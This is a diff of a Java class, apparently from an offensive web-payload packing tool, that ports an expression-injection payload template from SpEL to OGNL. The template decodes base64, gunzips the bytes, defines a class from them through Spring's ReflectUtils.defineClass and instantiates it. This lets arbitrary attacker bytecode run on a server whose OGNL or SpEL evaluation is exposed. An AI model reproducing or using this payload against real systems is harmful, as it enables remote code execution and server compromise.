@@ -1,4 +1,4 @@
-package com.reajason.javaweb.packer.spel;
+package com.reajason.javaweb.packer.ognl;
 
 import com.reajason.javaweb.packer.ClassPackerConfig;
 import com.reajason.javaweb.packer.Packer;
@@ -9,13 +9,12 @@ import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.util.zip.GZIPOutputStream;
 
-
 /**
  * @author ReaJason
- * @since 2024/12/13
+ * @since 2025/7/7
  */
-public class SpELSpringIOUtilsGzipPacker implements Packer {
-    String template = "T(org.springframework.cglib.core.ReflectUtils).defineClass('{{className}}',T(org.apache.commons.io.IOUtils).toByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(T(org.springframework.util.Base64Utils).decodeFromString('{{base64Str}}')))),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()";
+public class OGNLSpringIOUtilsGzipPacker implements Packer {
+    String template = "(@org.springframework.cglib.core.ReflectUtils@defineClass('{{className}}',@org.apache.commons.io.IOUtils@toByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(@org.springframework.util.Base64Utils@decodeFromString('{{base64Str}}')))),@java.lang.Thread@currentThread().getContextClassLoader())).newInstance()";
 
     @Override
     @SneakyThrows
